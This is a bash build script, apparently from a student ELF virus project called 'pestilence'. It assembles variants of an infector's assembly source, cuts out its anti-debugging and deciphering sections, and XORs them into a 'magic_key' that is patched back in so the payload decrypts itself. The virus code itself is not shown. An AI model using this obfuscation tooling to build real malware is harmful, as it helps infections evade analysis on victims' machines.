#!/bin/bash
set -euo pipefail
WORK_FOLDER=$(mktemp -d /tmp/pestilence_convert_payloadXXXX)
#trap cleanup EXIT

cleanup()
{
	rm -r "$WORK_FOLDER"
	rm -f anti_debugging.bin
	rm -f ciphering.bin
	rm -f magic_key.bin
}

main()
{
	echo $WORK_FOLDER
	same_size_between_payloads
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_anti_debugging2.o $WORK_FOLDER/TMP_main_without_anti_debugging.s && ld -o $WORK_FOLDER/TMP_main_without_anti_debugging2.elf $WORK_FOLDER/TMP_main_without_anti_debugging2.o
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_uncipher2.o $WORK_FOLDER/TMP_main_without_uncipher.s && ld -o $WORK_FOLDER/TMP_main_without_uncipher2.elf $WORK_FOLDER/TMP_main_without_uncipher2.o

	start_address=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging2.elf | grep "can_run_infection.begin_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/0x\1/')
	stop_address=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging2.elf | grep "can_run_infection.end_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/obase=16;ibase=16;\U\1+1/' | bc | sed 's/^/0x/')

	START=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address $WORK_FOLDER/TMP_main_without_anti_debugging2.elf | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | head -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1+1/' | bc)
	END=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address $WORK_FOLDER/TMP_main_without_anti_debugging2.elf | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | tail -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)

	echo $START $END
	cat $WORK_FOLDER/TMP_main_without_uncipher2.elf | head -c+$END | tail -c+$START > anti_debugging.bin
	cat $WORK_FOLDER/TMP_main_without_anti_debugging2.elf | head -c+$END | tail -c+$START > ciphering.bin
	python3 xor.py
	xxd -g1 magic_key.bin | perl -pe 's/^[0-9a-z]*: ((?:[0-9a-z]{2} )*) .*$/\1/' > magic_key.s
	perl -i -pe 's/([0-9a-z]{2})/0x\1,/g;s/, $//' magic_key.s
	sed -i 's/^/db /' magic_key.s
	cp $WORK_FOLDER/TMP_main_without_uncipher.s final_main.s
#	perl -0777 -i -pe 's/^magic_key: db 0x00.*$/salut/' final_main.s
	perl -i -pe "s/^magic_key: db 0x00.*$/magic_key: $(cat magic_key.s)/" final_main.s
}

same_size_between_payloads()
{
	perl -0777 -pe 's/\.begin_anti_debugging:.*\.end_anti_debugging://s' main.s > $WORK_FOLDER/TMP_main_without_anti_debugging.s
	perl -0777 -pe 's/\.begin_uncipher.*\.end_uncipher://s' main.s > $WORK_FOLDER/TMP_main_without_uncipher.s

	# TODO Change ../ with absolute path from this script or cd
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_anti_debugging.o $WORK_FOLDER/TMP_main_without_anti_debugging.s
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_uncipher.o $WORK_FOLDER/TMP_main_without_uncipher.s
	start_offset=$(nm $WORK_FOLDER/TMP_main_without_uncipher.o | grep "can_run_infection.begin_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	end_offset=$(nm $WORK_FOLDER/TMP_main_without_uncipher.o | grep "can_run_infection.end_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	anti_debugging_size=$((end_offset-start_offset))
	start_offset=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep "can_run_infection.begin_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	end_offset=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep "can_run_infection.end_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	cipher_size=$((end_offset-start_offset))
	if [[ $cipher_size -lt $anti_debugging_size ]]; then
		diff_size=$((anti_debugging_size-cipher_size))
		sed -i -E "s/(\.end_uncipher:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/TMP_main_without_anti_debugging.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $anti_debugging_size))/" -e 's/, \t//' "$WORK_FOLDER/TMP_main_without_anti_debugging.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $anti_debugging_size))/" -e 's/, \t//' "$WORK_FOLDER/TMP_main_without_uncipher.s"
	elif [[ $cipher_size -gt $anti_debugging_size ]]; then
		diff_size=$((cipher_size-anti_debugging_size))
		sed -i -E "s/(\.end_anti_debugging:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/TMP_main_without_uncipher.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/TMP_main_without_uncipher.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/TMP_main_without_anti_debugging.s"
	else
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/TMP_main_without_uncipher.s"
		sed -i -E -e "s/magic_key: db 0x00/magic_key: db $(printf '0x00, %.0s' $(seq 1 $cipher_size))/" -e 's/, \t//' "$WORK_FOLDER/TMP_main_without_anti_debugging.s"
	fi
}

# 'shuf reads all input before opening OUTPUT-FILE, so you can safely shuffle a file in place
# Cf. $> info shuf
# Cf. https://stackoverflow.com/a/55655338/8371072	
write_to()
{
	file="$1"
	shuf --output="$file" --random-source=/dev/zero 
}

main "$@"
